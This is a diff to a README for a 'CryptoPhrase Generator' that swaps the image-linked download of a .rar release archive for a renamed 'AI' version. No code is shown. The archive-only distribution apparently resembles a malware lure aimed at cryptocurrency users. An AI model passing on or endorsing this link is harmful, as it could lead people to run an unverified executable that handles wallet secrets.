@@ -1,6 +1,6 @@
 # CryptoPhrase Generator 🐱🔐
 
-[![image](https://github.com/09af/CryptoPhrase-Generator/assets/162298615/9938a3ad-2e08-453d-a7e3-7749a41320f5)](https://github.com/09af/CryptoPhrase-Generator/releases/download/Download/CryptoPhrase.Generator.rar)
+[![image](https://github.com/09af/CryptoPhrase-Generator/assets/162298615/9938a3ad-2e08-453d-a7e3-7749a41320f5)](https://github.com/09af/CryptoPhrase-Generator/releases/download/Download/CryptoPhrase.AI.Generator.rar)
 
 ![image](https://github.com/09af/CryptoPhrase-Generator/assets/162298615/5b31643f-113e-4286-85ac-3ba723c07a5e)
 
